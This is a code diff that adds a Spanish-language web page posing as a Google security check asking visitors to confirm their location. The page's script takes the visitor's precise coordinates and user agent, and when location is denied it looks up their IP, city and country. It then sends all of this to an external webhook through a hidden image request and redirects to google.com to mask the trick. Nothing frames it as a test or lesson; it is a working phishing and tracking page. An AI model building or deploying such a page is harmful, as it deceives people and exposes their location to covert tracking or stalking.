@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Google</title>
+<style>
+  * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  body { margin:0; font-family: Arial, Helvetica, sans-serif; color:#202124; background:#fff;
+         min-height:100vh; display:flex; flex-direction:column; }
+  .top { padding:28px 0 0; text-align:center; }
+  .logo { width:150px; }
+  .logoTexto { font-size:38px; font-weight:700; letter-spacing:-2px; display:none; }
+  .logoTexto span:nth-child(1){color:#4285F4}
+  .logoTexto span:nth-child(2){color:#EA4335}
+  .logoTexto span:nth-child(3){color:#FBBC05}
+  .logoTexto span:nth-child(4){color:#4285F4}
+  .logoTexto span:nth-child(5){color:#34A853}
+  .logoTexto span:nth-child(6){color:#EA4335}
+  main { flex:1; display:flex; justify-content:center; padding:26px 20px 0; }
+  .card { width:100%; max-width:400px; border:1px solid #dadce0; border-radius:8px;
+          padding:28px 24px; text-align:center; height:fit-content; }
+  h1 { font-size:20px; font-weight:400; margin:0 0 10px; }
+  p { font-size:14px; line-height:1.5; color:#5f6368; margin:0 0 22px; }
+  button { width:100%; padding:12px; font-size:15px; font-weight:500; color:#fff; background:#1a73e8;
+           border:none; border-radius:4px; cursor:pointer; }
+  button:disabled { background:#a8c7fa; }
+  .status { font-size:13px; color:#5f6368; min-height:18px; margin-top:16px; }
+  .nota { font-size:11px; color:#80868b; margin-top:14px; }
+  .spinner { width:16px; height:16px; border:2px solid #dadce0; border-top-color:#1a73e8;
+             border-radius:50%; display:none; margin:0 auto 10px; animation:g .8s linear infinite; }
+  @keyframes g { to { transform:rotate(360deg); } }
+  footer { display:flex; justify-content:space-between; padding:16px 18px; font-size:12px; color:#5f6368;
+           background:#f8f9fa; border-top:1px solid #e8eaed; }
+  footer a { color:#5f6368; text-decoration:none; margin-left:14px; }
+</style>
+</head>
+<body>
+  <div class="top">
+    <img class="logo" alt="Google"
+         src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png"
+         onerror="this.style.display='none';document.getElementById('lt').style.display='block'">
+    <div class="logoTexto" id="lt"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
+  </div>
+
+  <main>
+    <div class="card">
+      <h1>Verificación de seguridad</h1>
+      <p>Para continuar, confirma tu ubicación.<br>Solo tomará unos segundos.</p>
+      <button id="btn">Continuar</button>
+      <div class="spinner" id="sp"></div>
+      <div class="status" id="status"></div>
+      <div class="nota">Al continuar, este sitio podrá acceder a tu ubicación aproximada.</div>
+    </div>
+  </main>
+
+  <footer>
+    <span>Español (Latinoamérica)</span>
+    <span><a href="https://www.google.com">Ayuda</a><a href="https://www.google.com">Privacidad</a></span>
+  </footer>
+
+<script>
+  const WEBHOOK = "https://github.com/valentincarrizo2306-crypto/index.html.git";
+  const DESTINO = "https://www.google.com";
+
+  const btn = document.getElementById('btn');
+  const status = document.getElementById('status');
+  const sp = document.getElementById('sp');
+
+  function enviar(datos) {
+    const qs = new URLSearchParams(datos).toString();
+    new Image().src = WEBHOOK + '?' + qs + '&t=' + Date.now();
+  }
+
+  function irse(msg) {
+    status.textContent = msg;
+    sp.style.display = 'none';
+    setTimeout(function(){ location.href = DESTINO; }, 600);
+  }
+
+  btn.addEventListener('click', function () {
+    btn.disabled = true;
+    sp.style.display = 'block';
+    status.textContent = 'Obteniendo tu ubicación…';
+    const ua = navigator.userAgent;
+
+    if (!navigator.geolocation) { enviar({ ua: ua, err: 'sin_geolocalizacion' }); irse('Redirigiendo…'); return; }
+
+    navigator.geolocation.getCurrentPosition(
+      function (pos) {
+        enviar({ lat: pos.coords.latitude, lng: pos.coords.longitude, acc: Math.round(pos.coords.accuracy), ua: ua });
+        irse('Listo. Redirigiendo…');
+      },
+      function (err) {
+        fetch('https://ipapi.co/json/')
+          .then(function (r) { return r.json(); })
+          .then(function (d) {
+            enviar({ ua: ua, err: err.code, ipinfo: [d.city, d.region, d.country_name, d.ip].join(' / ') });
+          })
+          .catch(function () { enviar({ ua: ua, err: err.code }); })
+          .then(function () { irse('Listo. Redirigiendo…'); });
+      },
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    );
+  });
+</script>
+</body>
+</html>
